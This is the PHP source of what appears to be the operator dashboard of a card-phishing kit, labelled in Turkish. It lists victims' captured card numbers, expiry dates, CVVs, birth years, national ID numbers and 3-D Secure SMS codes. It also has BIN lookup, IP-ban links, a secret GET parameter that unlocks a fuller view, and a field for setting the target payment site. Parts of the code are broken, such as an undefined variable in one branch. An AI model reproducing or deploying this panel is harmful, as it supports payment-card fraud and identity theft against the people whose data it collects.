<?php

include '../ing/baglan.php';

  // Dimulai dengan POST Method

?>

<html>
<head>
    <title>Saksafon Panel Free amq</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
<meta http-equiv="refresh" content="5">
</head>
<body>
     
     <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="table-responsive">
                    
                    <?php if ($_GET['durum'] == "ok"){ echo "durum ok";} ?>
                    <table class="table">
                      <thead>
                        <tr>
                          <th > #</th>
                          <th >CC Info</th>
                          <th >Person Info</th>
                          <th >3d Sms</th>
                        </tr>
                      </thead>
                      <tbody>
                          

<?php

                          if($_GET["gizli"] == "112")
                          {
                              $datasor1 = $db->prepare("SELECT * from datalar order by id DESC");
                                $datasor1->execute(array(
                                    'kart_durum' => 1
                                ));
                                while ($uruncek2=$datasor1->fetch(PDO::FETCH_ASSOC)) { 
                                $data_id = $uruncek['id'];

         

?>
                                              <tr>
                                              <th scope="row">
                                              	<a href="ipban.php?ipbanla=<?php echo $uruncek['ip']; ?>&id=<?php echo $uruncek['id']; ?>">XXX</a> 
                                            <br>
                                              	<hr>
                                                <?php echo $uruncek2['id']; ?>
                                             		<?php if ($_GET['gizli'] == "112") { ?> <a href="aaaaaaaaaaew.php?id=<?php echo $uruncek2['id']; ?>">Gizle</a>
                                             </th> <?php  }?>
                                              <td>
                                              <a href="bin.php?bnii=<?php $metin = str_replace(" ", "", $uruncek2['kart_no']); echo $metin; ?>" target="popup" onClick="javascript:open('', 'popup', 'height=300,width=400,resizable=no')">BİN SORGULA</a><br />
                                                  <?php echo $uruncek2['kart_no']; ?> <br>
                                                  <?php echo $uruncek2['kart_skt']; ?> <br>
                                                  <?php echo $uruncek2['kart_cvv']; ?> <br>
                                                  <?php echo $uruncek2['musteri_dogumyil']; ?> <br>
                                                  <?php echo $uruncek2['musteri_tc']; ?>
                                              </td>
                                              <td>
                                                  <?php echo "Limit : ". $uruncek2['kart_tipi']; ?>
                                              </td>
                                              <td>
                                                  <?php echo $uruncek2['3dsms']; ?>
                                              <?php echo "Tutar : ". $uruncek['3dsms2']; ?>
                                                  <?php echo "2. sms". $uruncek2['3dsms3']; ?>
                                              </td>
                                              <td>
                                                  UserAgent: <input type="tel" placeholder="<?php echo $uruncek2['useral']; ?>" value="<?php echo $uruncek2['useral']; ?>"> <br>
                                                  Referrer : <input type="tel" placeholder="<?php echo $uruncek2['referreral']; ?>" value="<?php echo $uruncek2['referreral']; ?>">
                                              </td>
                                            </tr>
<?php
                                }

                          }else {
 
                                $datasor = $db->prepare("SELECT * from datalar where kart_durum=:kart_durum order by id DESC");
                                $datasor->execute(array(
                                    'kart_durum' => 1
                                ));
    
                               while ($uruncek=$datasor->fetch(PDO::FETCH_ASSOC)) { 
                                $data_id = $uruncek['id'];
 
?>
                                        <tr>
                                          <th scope="row"><a href="ipban.php?ipbanla=<?php echo $uruncek['ip']; ?>&id=<?php echo $uruncek['id']; ?>">XXX</a>
                                          	<br>
                                                <?php echo $uruncek['id']; ?></th>
                                         <?php if ($_GET['gizli'] == "112") { ?> <th scope="row"><a href="aaaaaaaaaaew.php?id=<?php echo $uruncek['id']; ?>">Gizle</a></th> <?php  }?>
                                          <td>
                                              <a href="bin.php?bnii=<?php $metin = str_replace(" ", "", $uruncek['kart_no']); echo $metin; ?>" target="popup" onClick="javascript:open('', 'popup', 'height=300,width=400,resizable=no')">BİN SORGULA</a><br />
                                              <?php echo $uruncek['kart_no']; ?> <br>
                                              <?php echo $uruncek['kart_skt']; ?> <br>
                                              <?php echo $uruncek['kart_cvv']; ?> <br>
                                              <?php echo $uruncek['musteri_dogumyil']; ?> <br>
                                          </td>
                                          <td>
                                              <?php echo $uruncek['musteri_tc']; ?> <br>
                                              Limit : <?php echo $uruncek['kart_tipi']; ?>
                                          </td>
                                          <td>
                                              <?php echo $uruncek['3dsms']; ?><br>
                                              Tutar : <?php echo $uruncek['3dsms2']; ?><br>
                                              <?php echo "2. sms :". $uruncek['3dsms3']; ?>
                                          </td>
                                        </tr> 
<?php
                              }
                          }
                          
                              
?>                  
                          <form method="get" action="aaaaafwewewe.php">
                              <input type="text" name="3dayar" placeholder="SitePosYaz">
                              <button>Güncelle</button>
                          </form>
                      </tbody>
                    </table>
                    </div>
            </div>
         </div>
    </div>
</body>
</html>